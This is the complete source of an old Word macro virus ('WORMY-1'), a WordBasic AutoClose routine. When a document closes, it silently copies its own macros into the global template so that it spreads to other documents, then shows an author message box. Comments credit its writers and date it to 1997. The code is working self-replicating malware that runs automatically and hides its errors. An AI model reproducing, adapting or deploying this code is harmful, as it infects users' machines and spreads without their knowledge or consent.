Attribute VB_Name = "AutoClose"

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim bInstalled
Dim sMe$
Dim sMacro$
Dim ExecuteOnly
    On Error GoTo -1: On Error GoTo Abort
    iMacroCount = WordBasic.CountMacros(0, 0)
    For i = 1 To iMacroCount
        If WordBasic.[MacroName$](i, 0, 0) = "DCloseAN" Then
            bInstalled = -1
        End If
    Next i
    If Not bInstalled Then
        sMe$ = WordBasic.[FileName$]()
        sMacro$ = sMe$ + ":TCloseAN"
        WordBasic.MacroCopy sMacro$, "AutoClose", ExecuteOnly
        sMacro$ = sMe$ + ":AutoClose"
        WordBasic.MacroCopy sMacro$, "DCloseAN", ExecuteOnly
        WordBasic.MsgBox "WORMY-1 by NAENBGOURSG", -2
                'by NAENBGOURSG
                'SO.HT.AI.KS
                '231076-GREECE
                'Thanks to NEURO
                'VRD 19-4-1997
                'VRP A.U.A (Ã.Ð.Á)
        End If
Abort:
End Sub
